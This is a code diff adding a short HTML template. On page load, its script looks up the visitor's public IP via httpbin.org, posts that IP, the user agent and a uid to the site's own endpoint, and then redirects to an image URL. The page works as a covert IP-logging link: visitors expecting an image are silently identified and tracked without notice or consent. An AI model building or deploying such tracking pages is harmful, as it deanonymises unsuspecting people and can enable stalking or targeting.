@@ -1,0 +1,20 @@
+{% extends "base.html" %}
+{% block content %}
+
+<script>
+
+    $(function() {
+        $.getJSON('//httpbin.org/ip', (res) => {
+            $.post('/api/post', {
+                'uid': '{{ uid }}',
+                'ip': res['origin'],
+                'user-agent': window.navigator.userAgent,
+            }, (t) => {
+                window.location.replace("https://google.com/images/xbcaoi.png");
+            })
+        })
+    })
+
+</script>
+
+{% endblock %}
